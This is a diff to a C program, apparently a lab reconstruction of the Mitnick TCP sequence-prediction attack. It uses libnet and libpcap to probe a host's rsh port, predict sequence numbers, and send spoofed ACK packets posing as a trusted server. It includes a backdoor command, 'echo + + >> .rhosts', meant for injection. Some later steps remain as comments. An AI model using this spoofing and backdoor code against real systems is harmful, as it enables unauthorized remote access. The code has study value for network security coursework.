@@ -24,16 +24,6 @@ char * XTERMINAL_IP = "172.16.16.4";
 //initializations as per tcpdump online documentation
 #include <inttypes.h>
 
-/*
-typedef unsigned char nd_uint8_t[1];
-typedef unsigned char nd_uint16_t[2];
-typedef unsigned char nd_uint24_t[3];
-typedef unsigned char nd_uint32_t[4];
-typedef unsigned char nd_uint40_t[5];
-typedef unsigned char nd_uint48_t[6];
-typedef unsigned char nd_uint56_t[7];
-typedef unsigned char nd_uint64_t[8];*/
-
 #define SIZE_ETH 14
 
 /* IP header */
@@ -86,6 +76,8 @@ struct tcp_hdr {
 
 //function definitions
 int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
+int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack);
+tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2);
 
 //shimomura you're doomed
 int main (void)
@@ -143,15 +135,15 @@ int main (void)
 	//contact xterminal to figure out next seq #
 
 	//libpcap setup
-	pcap_t *handle;			/* Session handle */
-	char *dev;			/* The device to sniff on */
-	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
-	struct bpf_program fp;		/* The compiled filter */
-	char filter_exp[] = "src host xterminal";	/* The filter expression */
-	bpf_u_int32 mask;		/* Our netmask */
-	bpf_u_int32 net;		/* Our IP */
-	struct pcap_pkthdr header;	/* The header that pcap gives us */
-	const u_char *packet;		/* The actual packet */
+	pcap_t *handle;																// Session handle
+	char *dev;																		// The device to sniff, eth0?
+	char errbuf[PCAP_ERRBUF_SIZE];								// Error string
+	struct bpf_program fp;												// The compiled filter
+	char filter_exp[] = "src host xterminal";			// The filter expression, only packets that I receive from xterminal
+	bpf_u_int32 mask;															// Netmask
+	bpf_u_int32 net;															// kevin IP
+	struct pcap_pkthdr header;										// pcap header
+	const u_char *packet;													// sniffed packet
 	const struct ip_hdr *ip_hdr;
 	const struct tcp_hdr *tcp_hdr;
 
@@ -189,25 +181,15 @@ int main (void)
 	}
 
 	//probe xterminal
+	tcp_seq seq_array[5]; //actually I onlly need 2
 
 	printf("Starting probing\n");
-	for (i = 0; i < 10; i++)
+	for (i = 0; i < 5; i++)
 	{
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
-		printf("probe\n");
 		send_syn(514, NULL, 0, l, xterm_ip, kevin_ip);
-		/* Grab a packet */
 		packet = pcap_next(handle, &header);
-		/* Print its length */
-		printf("Jacked a packet with length of [%d]\n", header.len);
 
-		//if (header.len != 60)
-		//{
-		//	packet = pcap_next(handle, &header);
-
-		//}
-		//else
-		//{
 		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
 		tcp_hdr = (const struct tcp_hdr *) (packet + SIZE_ETH + sizeof(struct ip_hdr));
 
@@ -215,13 +197,35 @@ int main (void)
 		tcp_seq ack = htonl(tcp_hdr->th_ack);
 
 		printf("seq %u, ack %u\n", seq, ack);
-		//}
+		seq_array[i] = seq;
 
 	}
 
 	pcap_close(handle);
-	//impersonate trusted server
 
+	//compute nextseq
+	printf("predictions\n");
+	printf("%u", compute_next_seq(seq_array[0], seq_array[1]));
+	printf("%u", compute_next_seq(seq_array[1], seq_array[2]));
+	printf("%u", compute_next_seq(seq_array[2], seq_array[3]));
+	printf("%u", compute_next_seq(seq_array[3], seq_array[4]));
+
+
+	//exploit trust relation
+	char username[] = "tsumotsu";
+	char command[] = "echo + + >> .rhosts";
+
+
+	//send syn impersonating the server
+	//send_syn(514, NULL, 0, l, xterm_ip, sever_ip);
+
+	//send ack with predicted seq
+
+	//inject backdoor
+
+	//connect from my own ip
+
+	//enable the server back
 
 	exit(EXIT_SUCCESS);
 }
@@ -253,7 +257,6 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		printf("error while crafting tcp syn\n");
 		exit(EXIT_FAILURE);
 	}
-
 
 	//build ip fragment containing syn
 	t = libnet_build_ipv4(
@@ -292,4 +295,80 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 
 	libnet_clear_packet(l);
 	return 1;
+}
+
+
+int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack)
+{
+
+	libnet_ptag_t t;
+	//build syn
+	t = libnet_build_tcp(
+		src_port, 											//sp source port
+		dest_port,											//dp destinatin port
+		my_seq, 												//sequence number
+    ack, 														//ack number, can I send whatever?
+    TH_ACK,													//control bit SYN
+		2048, 													//window size, random is ok?
+		0,															//checksum, if 0 libnet autofills
+		10,															//urgent pointer
+		LIBNET_TCP_H + payload,					//len = tcp header + size of backdoor
+		payload,												//payload backdoor
+		payload_s,											//payload size
+		l,															//pointer to libnet context
+		0																//protocol tag, 0 to build a new one
+	);
+
+	if (t == -1)
+	{
+		printf("error while crafting tcp syn\n");
+		exit(EXIT_FAILURE);
+	}
+
+	//build ip fragment containing syn
+	t = libnet_build_ipv4(
+		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
+		0,																				//tos, type of service
+		0,																				//id, ip identification
+		0,																				//fragmentation bits and offset
+		libnet_get_prand(LIBNET_PR8),							//ttl
+    IPPROTO_TCP,															//upper protocol
+    0,																				//checksum, 0 to autofill
+    server_ip,																//src, server ip
+    xterm_ip,																	//destination, xterm ip
+    NULL,																			//payload
+    0,																				//payload len
+		l,																				//libnet context
+		0																					//protocol tag
+	);
+
+	if (t == -1)
+	{
+		printf("error while crafting ip header\n");
+		exit(EXIT_FAILURE);
+	}
+
+	//send packet
+	int success = libnet_write(l);
+	if (success == -1)
+	{
+		printf("error while sending packet\n");
+		exit(EXIT_FAILURE);
+	}
+	else
+	{
+		printf("sent %d\n", success);
+	}
+
+	libnet_clear_packet(l);
+	return 1;
+}
+
+
+tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2)
+{
+	//expression for next sequence number
+	//seq(N) = 2seq(N-1) - seq(N-2) + 3
+	tcp_seq n = 2*n1 - n2 + 3;
+	return n;
 }
